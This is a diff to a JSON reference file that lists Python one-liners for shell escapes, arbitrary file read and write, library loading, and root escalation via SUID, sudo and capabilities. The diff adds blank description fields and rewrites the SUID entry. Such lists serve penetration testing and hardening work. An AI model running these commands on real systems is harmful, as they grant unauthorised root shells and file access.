@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        
+        "description": "",
         "code": "python -c 'import os; os.system(\"/bin/sh\")'\n"
       }
     ],
@@ -30,37 +30,37 @@
     ],
     "file-write": [
       {
-        
+        "description": "",
         "code": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'\n"
       }
     ],
     "file-read": [
       {
-        
+        "description": "",
         "code": "python -c 'print(open(\"file_to_read\").read())'\n"
       }
     ],
     "library-load": [
       {
-        
+        "description": "",
         "code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'\n"
       }
     ],
     "suid": [
       {
-        
-        "code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n"
+        "description": "",
+        "code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
       }
     ],
     "sudo": [
       {
-        
+        "description": "",
         "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'\n"
       }
     ],
     "capabilities": [
       {
-        
+        "description": "",
         "code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n"
       }
     ]
